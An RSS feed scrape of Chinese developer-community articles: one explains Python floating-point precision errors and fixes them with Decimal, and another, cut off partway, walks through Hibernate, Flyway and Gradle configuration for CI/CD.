<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Python 浮点数陷阱详解：如何完美解决 x * 0.1 的精度问题]]></title>    <link>https://juejin.cn/post/7603252259560177700</link>    <guid>https://juejin.cn/post/7603252259560177700</guid>    <pubDate>2026-02-05T14:17:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603252259560177700" data-draft-id="7603030564837081142" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python 浮点数陷阱详解：如何完美解决 x * 0.1 的精度问题"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-05T14:17:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python 浮点数陷阱详解：如何完美解决 x * 0.1 的精度问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:17:22.000Z" title="Thu Feb 05 2026 14:17:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. 现象： 为什么读到的温度计数据小数位有那么多？</h3>
<p>刚到了一个温湿度传感器，我就把他接入到八哥开关小帮手上面。
数据是通过Modbus-RTU的协议传输到服务器上，是一个整型 int16AB 编码，刚好是10倍的关系，
计算公式为 value = 0.1 * read_value。
计算出来的数据很奇怪，18.9000000000002，后面多出来了好多的小数点，用眼睛看就知道有问题了。
我们希望的是得到 18.9，但计算机给出了一个带有微小“尾巴”的数字。这并不是 Python 的 bug，而是计算机底层存储浮点数方式导致的物理限制。</p>
<h3 data-id="heading-1">2. 原理：二进制的世界没有 0.1</h3>
<p>计算机使用 <strong>IEEE 754 标准</strong> 的二进制浮点数来存储小数。</p>
<p>在十进制中，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>3</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span> 是无限循环小数 (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.3333...</mn></mrow><annotation encoding="application/x-tex">0.3333...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.3333...</span></span></span></span></span>)；同理，在二进制中，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>10</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{10}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span> (即 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.1</mn></mrow><annotation encoding="application/x-tex">0.1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.1</span></span></span></span></span>) 也是一个无限循环小数：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.</mn><msub><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo></mrow></msub><mo>=</mo><mn>0.00011001100110011..</mn><msub><mi mathvariant="normal">.</mi><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">0.1_{(10)} = 0.00011001100110011..._{(2)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9996em;vertical-align:-0.3552em;"/><span class="mord">0.</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">10</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.9996em;vertical-align:-0.3552em;"/><span class="mord">0.00011001100110011..</span><span class="mord"><span class="mord">.</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span></p>
<p>因为计算机的存储空间（53位有效数字）是有限的，它必须在某一位进行<strong>截断</strong>。这种截断导致了微小的精度丢失，就像把 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.3333...</mn></mrow><annotation encoding="application/x-tex">0.3333...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.3333...</span></span></span></span></span> 截断为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.3333</mn></mrow><annotation encoding="application/x-tex">0.3333</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.3333</span></span></span></span></span> 一样，结果虽然极其接近，但在数学上并不完全相等。</p>
<h3 data-id="heading-2">3. 采用 decimal 金融级精确计算来解决</h3>
<p><code>Decimal</code> 模块模拟了人类手算的方式，避免了二进制转换误差，这样我们算出来的数据就不会出现那么多的小数位了。</p>
<p>Python</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">from</span> <span class="hljs-type">decimal</span> import <span class="hljs-type">Decimal</span>

# 核心原则：必须以 <span class="hljs-string">'字符串'</span> 形式初始化
a <span class="hljs-operator">=</span> <span class="hljs-type">Decimal</span>(<span class="hljs-string">'189'</span>)
b <span class="hljs-operator">=</span> <span class="hljs-type">Decimal</span>(<span class="hljs-string">'0.1'</span>)

print(a <span class="hljs-operator">*</span> b)  
# 输出: <span class="hljs-number">18.9</span> (类型为 <span class="hljs-type">Decimal</span>)
</code></pre>
<blockquote>
<p><strong>警告</strong>：如果写成 <code>Decimal(0.1)</code>，由于括号内的 0.1 已经是浮点数，误差会被带入 <code>Decimal</code> 中，导致前功尽弃。</p>
</blockquote>
<h3 data-id="heading-3">4. 终于没有那么多的小数位了</h3>
<p>经过 Decimal 的处理，终于可以计算出正确的数字了，没有那么多的小数位。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（85）如何在持续集成/持续部署（CI/CD）中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7603252259560259620</link>    <guid>https://juejin.cn/post/7603252259560259620</guid>    <pubDate>2026-02-05T14:26:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603252259560259620" data-draft-id="7603221478473728042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（85）如何在持续集成/持续部署（CI/CD）中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T14:26:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（85）如何在持续集成/持续部署（CI/CD）中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:26:37.000Z" title="Thu Feb 05 2026 14:26:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在持续集成/持续部署（CI/CD）流程中使用Hibernate，目的是通过自动化的方式管理和测试数据库操作，从而保证代码在合并和部署时的可靠性和一致性。以下是一个详细的示例，分步骤讲解如何在CI/CD中集成Hibernate，包括数据库配置、迁移、数据种子、自动化测试以及GitHub Actions等CI工具的使用。</p>
<h3 data-id="heading-0">前提条件</h3>
<ul>
<li>本示例使用MySQL作为数据库。</li>
<li>使用Gradle作为构建工具。</li>
<li>利用Flyway进行数据库迁移管理。</li>
<li>使用JUnit进行单元测试。</li>
<li>采用GitHub Actions进行CI/CD。</li>
</ul>
<h3 data-id="heading-1">1. 设置Hibernate配置</h3>
<p>创建一个Hibernate配置文件<code>hibernate.cfg.xml</code>，用于连接数据库。</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/devops_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>db_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>db_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. 创建实体类</h3>
<p>定义一个简单的实体类来表示数据库表中的数据。</p>
<h4 data-id="heading-4"><code>User.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "users")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String email;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h3 data-id="heading-5">3. 数据库迁移工具</h3>
<p>使用Flyway进行数据库迁移管理。</p>
<h4 data-id="heading-6">Flyway配置（<code>build.gradle</code>）</h4>
<p>在Gradle构建脚本中添加Flyway插件和配置。</p>
<pre><code class="hljs language-groovy" lang="groovy">plugins {
    id 'java'
    id 'org.flywaydb.flyway' version '8.5.13'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.hibernate:hibernate-core:5.6.5.Final'
    implementation 'mysql:mysql-connector-java:8.0.27'
    implementation 'org.flywaydb:flyway-core:8.5.13'
    testImplementation 'org.junit.jupiter:junit-jupiter:5.8.2'
}

flyway {
    url = 'jdbc:mysql://localhost:3306/devops_db'
    user = 'db_user'
    password = 'db_password'
    locations = ['filesystem:src/main/resources/db/migration']
}
</code></pre>
<h4 data-id="heading-7">创建迁移脚本</h4>
<p>在<code>src/main/resources/db/migration</code>目录下创建迁移脚本<code>V1__Create_users_table.sql</code>。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
    id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);
</code></pre>
<h3 data-id="heading-8">4. 编写数据种子</h3>
<p>编写一个初始化数据的类，用于在应用程序启动时插入一些初始数据。</p>
<h4 data-id="heading-9"><code>DataSeeder.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSeeder</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Configure Hibernate</span>
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> config.buildSessionFactory();

        <span class="hljs-comment">// Seed data</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user1.setName(<span class="hljs-string">"Alice"</span>);
